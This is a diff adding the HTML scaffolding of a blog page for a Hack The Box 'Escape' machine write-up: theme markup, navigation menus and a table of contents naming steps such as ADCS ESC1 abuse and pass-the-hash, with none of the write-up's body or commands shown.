@@ -1,0 +1,3326 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="ch3ckm8">
+      
+      
+        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_Escape/">
+      
+      
+        <link rel="prev" href="../ch3ckm8_HTB_cicada/">
+      
+      
+        <link rel="next" href="../ch3ckm8_HTB_Flight/">
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>Escape - Ch3ckm8 Vault</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
+    
+      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
+    
+      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#intro" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Ch3ckm8 Vault
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Escape
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Welcome
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
+          
+  
+  
+  HTB Writeups
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
+          
+  
+  
+  Other CTF Writeups
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../common_tools/" class="md-tabs__link">
+          
+  
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../windows/" class="md-tabs__link">
+          
+  
+  
+  Tags
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>
+
+    </a>
+    Ch3ckm8 Vault
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Welcome
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    HTB Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            HTB Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Administrator
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Blackfield/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blackfield
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Cascade/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cascade
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    EscapeTwo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Nocturnal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nocturnal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Return/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Return
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TheFrizz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forest
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_monteverde/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Monteverde
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sauna
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Timelapse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cicada
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Escape
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Escape
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Intro
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add-target-to-etchosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Add target to /etc/hosts
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rpc-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      RPC enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RPC enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-logon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anonymous logon
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-logon_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anonymous logon
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checking-where-we-can-login-with-the-given-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checking where we can login with the given creds
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-enumeration-as-publicuser" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP enumeration as PublicUser
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration-as-publicuser" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB enumeration as PublicUser
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql-enumeration-as-publicuser" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL enumeration as PublicUser
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#directories-and-files-enumeration-as-sql_svc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Directories and Files enumeration as sql_svc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checking-where-we-can-login-with-ryans-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checking where we can login with ryan’s creds
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privesc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privesc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-domain-groups" class="md-nav__link">
+    <span class="md-ellipsis">
+      Find domain groups:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-users-group-membership" class="md-nav__link">
+    <span class="md-ellipsis">
+      Current user’s Group membership
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-users-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Current user’s privileges:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-as-ryan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bloodhound as ryan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-adcs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerate ADCS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#abusing-esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abusing ESC1
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Abusing ESC1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-request-pfx-certificate" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Request pfx certificate
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-get-tgt-hash-from-the-certificate" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Get TGT hash from the certificate
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#login-as-administrator-via-pass-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Login as Administrator via pass the hash
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foothold_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privesc_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privesc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flow-chart" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flow chart
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sidenotes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sidenotes
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_Flight/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Flight
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_fluffy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fluffy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Puppy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tombwatcher
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_HTB_certified/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Certified
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Other CTF Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Other CTF Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RoboGRoot's-Portfolio
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../common_tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Commonly used tools and methodologies
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tags
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Tags
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AD
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADconnectAbuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ADconnectAbuse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AS-REP-roasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AS-REP-roasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AssumedBreach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AssumedBreach
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DCSync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DCSync
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Docker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Docker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GSSAPIauthentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    GSSAPIauthentication
+    
+  </span>
+  
+
